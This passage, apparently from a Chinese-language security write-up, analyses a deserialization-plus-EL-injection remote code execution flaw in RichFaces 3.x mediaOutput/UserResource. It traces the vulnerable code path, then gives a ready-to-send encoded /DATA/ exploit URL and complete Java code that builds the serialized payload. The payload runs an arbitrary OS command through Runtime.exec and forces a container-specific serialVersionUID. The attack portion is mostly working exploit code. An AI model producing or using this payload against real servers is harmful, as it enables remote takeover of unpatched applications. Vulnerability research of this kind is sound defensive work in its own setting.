                byte[] objectData;
                if (storeData instanceof byte[]) {
                    objectData = (byte[]) storeData;
                    uri.append(DATA_BYTES_SEPARATOR);
                } else {
                    ByteArrayOutputStream dataSteram = new ByteArrayOutputStream(
                            1024);
                    ObjectOutputStream objStream = new ObjectOutputStream(
                            dataSteram);
                    objStream.writeObject(storeData);
                    objStream.flush();
                    objStream.close();
                    dataSteram.close();
                    objectData = dataSteram.toByteArray();
                    uri.append(DATA_SEPARATOR);
                }
                byte[] dataArray = encrypt(objectData);
                uri.append(new String(dataArray, "ISO-8859-1"));
    [...]
         }
        boolean isGlobal = !resource.isSessionAware();
        String resourceURL = getWebXml(context).getFacesResourceURL(context,
                uri.toString(), isGlobal);// context.getApplication().getViewHandler().getResourceURL(context,uri.toString());
    [...]
        return resourceURL;// context.getExternalContext().encodeResourceURL(resourceURL);
    }
可以看见这个 storeData 其实就是我们的 UriData 对象，将其序列化后经过encrypt加入了返回的 resourceURL
中，这个就是我们的 payload 雏形
在浏览器里可以拿到 resourceURL 的值，如下：
这样，只要有 mediaOutput 的标签，总是会返回一个 src ，其值就是服务端已经序列化好的多媒体数据，我们仅仅需要 `/DATA/`
的前半段就好，后半段由我们自己构造
#### UserResource（java反序列化 + EL = RCE）
到目前为止，我们仅仅知道，一个请求过去以后，会执行 resource.getLastModified、resource.getExpired 还有
resource.send，期间反序列化的数据我们也是可控的，那么怎么利用呢，现在开始进入触发点 UserResource
以上三个函数：getLastModified、getExpired、send 只需要挑其中一个看就好，流程大致相似
查看 getExpired 代码如下：
先调用 restoreData 返回一个 UriData 对象，将其 expires 成员经过一定处理后进行 el 表达式解析，跟踪一下 UriData
对象如何获取的，如下图：
上图中的 deserializeData 返回的还是 objectArray 本身，就不贴图了，主要看 getResourceData
赋值就是由 setResourceData 操作的，它就是在前文中提到的 InternetResourceService#serviceResource
中由 resourceDataForKey放入resource上下文中存储的值
至此，触发流程已经全部理清
### 效果
首先将发送给服务器的 UserRessource 请求拦截，然后换上我们自己的poc
发包，结果如下：
### 总结
上文中提到的 resource.isCacheable(resourceContext) 的返回值，是由 mediaOutput 中的 cacheable
字段设置，如果为 ture 会触发 getLastModified、getExpired，如果为 false 会触发
getLastModified、send
首先，服务器会根据其web程序中含有的脚本中的 mediaOutput 标签进行解析，创建出 UserResource
实例，并且配置一个path做一个map映射，最终path会返回给前端进行多媒体的展示  
我们从前端拿到 path 后，自行构造 `/DATA/` 后面的反序列化内容  
服务器拿到我们提交的 url 后，会将反序列化内容转换成 UriData 对象，并最终调用 UserResource 中的
getLastModified、getExpired、send 函数，这三个函数中，都对 UriData 中的数据进行提取，然后执行 EL
表达式解析操作，最终造成 RCE
**由此可见，只要是使用了 richfaces 3.x-3.3.4 依赖，并且使用了其 mediaOutput 标签的程序，都可以RCE**
不过稍微有一点限制的就是，javax.el.MethodExpression 的 serialVersionUID
问题，因为它自身没有给一个确定的值，所以在不同的容器中凸显的值就不一样，我借用了 RF-13977 中的 tomcat 对应的
serialVersionUID 。不过这个问题也是可以解决的，在触发流程分析过程中，getLastModified 这个触发点是稳定触发的，它也不需要
MethodExpression ，仅仅保留POC中的 modified 的生成过程就好了
### POC
    /DATA/eAHFlc9PE0EUx4cqyg9!oBARjUldjRRjZsHgAbEJCRo1KZJQQIWDmW5f26mzP5idbTcSFA9evBhEb968wsmzEY3xYOKFv0APxhhjQky8GmdmSyuNeuDSnmZ3337fe5!v29eV76jZ5-i0y!OYFEk4WPRzmIPvBtwCPOUDn6hcnJzi9CIRBKlf57lvMbQzhfZaHIiAUdcR4AiBDqaKpERMRpy8OZ4pgiWGU2g3hB6VmnPoLmpKoRbbzdIchWzlurlEWAD6IvRkLaeURIhzxAIfW67tuY7UxmkhE11xWRZ4mpSA33z!Irn87MNYDMVSqNVixPevERu21pAWnDp5WUObL9!Jag2BDkVVUtdMA6eE0Tskw2A49FT6XpkS-4GjC2AgfAwMT5L8GIiCm70UerITn7qO5oBQ0x6EQo56oqJlaH3cXKq7febRp42YjuusxtWUnj94mP4xs35BRagKhpQZnFqFCEFAMfE8Ri0iZNqIQ32S61yGAMeJp!fPr0x81ky6MsSHyIRaLoGO6OZDE5g5rcDXnklMuzzCtZFHa1H1uYZD5VWLLDSuCi1mXF8zqlO7antsaHWh7cay6I0YHa72Xhdabluc!bj2a0kBUNqt5SeofGKew1wAvsB5EKPK3kRf9ZhyiZwDeYPJQ!TQUOpYTR6eCBxBbTB0fFR-wpAqtfvUKbm3IeEEjPVhCMFKGBZhltG38B8nPS-UTR!f0nQ9HNV1ZqP7Z!vrA2Oqa42qPN-4dlDAUeesdjOCU!kkVtenv3w9Nn9ZD52c5ZhAXZogdfF4ILxAyEAgtkAdNbDRNEkO5XforVkdUdOGLCXRWyaERDIA3yx6kE!rMw4Lwmbxkf4z!fGRgYGzA4NJY8viSDbIbCPUS2mHXjv!-O7rZvXPz16Z26EV9peX0L0GNRGHaL2ifdqoQFCG5aIGZdMbtLY9mwpyXd7KBU7SqKg33iJFu6dC-zFabBTtzX-vv-F-hV5uD3cx8EXS2JRuHGuBWpTzk3Lt!gZHm9YF.jsf
poc生成代码
    import com.sun.facelets.el.TagMethodExpression;
    import com.sun.facelets.el.TagValueExpression;
    import com.sun.facelets.tag.Location;
    import com.sun.facelets.tag.TagAttribute;
    import org.ajax4jsf.resource.UserResource;
    import org.ajax4jsf.util.base64.URL64Codec;
    import org.jboss.el.MethodExpressionImpl;
    import org.jboss.el.ValueExpressionImpl;
    import org.jboss.el.parser.*;
    import org.jboss.seam.core.Expressions;
    import org.richfaces.ui.application.StateMethodExpressionWrapper;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.io.OutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Modifier;
    import java.util.Date;
    import java.util.zip.Deflater;
    import javax.el.MethodExpression;
    import javax.faces.context.FacesContext;
    public class Main {
        public static void main(String[] args) throws Exception{
            String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")}";
            // tomcat8.5.24 MethodExpression serialVersionUID
            Long MethodExpressionSerialVersionUID = 8163925562047324656L;
            Class clazz = Class.forName("javax.el.MethodExpression");
            Field field = clazz.getField("serialVersionUID");
            field.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            field.setLong(null, MethodExpressionSerialVersionUID);
            // createContent
            MethodExpressionImpl mei = new MethodExpressionImpl(pocEL, null, null, null, null, new Class[]{OutputStream.class, Object.class});
            ValueExpressionImpl vei = new ValueExpressionImpl(pocEL, null, null, null, MethodExpression.class);
            StateMethodExpressionWrapper smew = new StateMethodExpressionWrapper(mei, vei);
            Location location = new Location("/richfaces/mediaOutput/examples/jpegSample.xhtml", 0, 0);
            TagAttribute tagAttribute = new TagAttribute(location, "", "", "@11214", "createContent="+pocEL);
            TagMethodExpression tagMethodExpression = new TagMethodExpression(tagAttribute, smew);
            Class cls = Class.forName("javax.faces.component.StateHolderSaver");
            Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
            ct.setAccessible(true);
            Object createContnet = ct.newInstance(null, tagMethodExpression);
            //value
            Object value = "haveTest";
            //modified
            TagAttribute tag = new TagAttribute(location, "", "", "just", "modified="+pocEL);
            ValueExpressionImpl ve = new ValueExpressionImpl(pocEL+" modified", null, null, null, Date.class);
            TagValueExpression tagValueExpression = new TagValueExpression(tag, ve);
            Object modified = ct.newInstance(null, tagValueExpression);
            //expires
            TagAttribute tag2 = new TagAttribute(location, "", "", "have_fun", "expires="+pocEL);
            ValueExpressionImpl ve2 = new ValueExpressionImpl(pocEL+" expires", null, null, null, Date.class);
            TagValueExpression tagValueExpression2 = new TagValueExpression(tag2, ve2);
            Object expires = ct.newInstance(null, tagValueExpression2);
            //payload object
            UserResource.UriData uriData = new UserResource.UriData();
            //Constructor con = UserResource.class.getConstructor(new Class[]{});
            Field fieldCreateContent = uriData.getClass().getDeclaredField("createContent");
            fieldCreateContent.setAccessible(true);
            fieldCreateContent.set(uriData, createContnet);
            Field fieldValue = uriData.getClass().getDeclaredField("value");
            fieldValue.setAccessible(true);
            fieldValue.set(uriData, value);
            Field fieldModefied = uriData.getClass().getDeclaredField("modified");
            fieldModefied.setAccessible(true);
            fieldModefied.set(uriData, modified);
            Field fieldExpires = uriData.getClass().getDeclaredField("expires");
            fieldExpires.setAccessible(true);
            fieldExpires.set(uriData, expires);
            //encrypt
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(uriData);
            objectOutputStream.flush();
            objectOutputStream.close();
            byteArrayOutputStream.close();
            byte[] pocData = byteArrayOutputStream.toByteArray();
            Deflater compressor = new Deflater(1);
            byte[] compressed = new byte[pocData.length + 100];
            compressor.setInput(pocData);
            compressor.finish();
            int totalOut = compressor.deflate(compressed);
            byte[] zipsrc = new byte[totalOut];
            System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
            compressor.end();
            byte[] dataArray = URL64Codec.encodeBase64(zipsrc);
            String poc = "/DATA/" + new String(dataArray, "ISO-8859-1") + ".jsf";
            System.out.println(poc);
        }
    }
Referer:  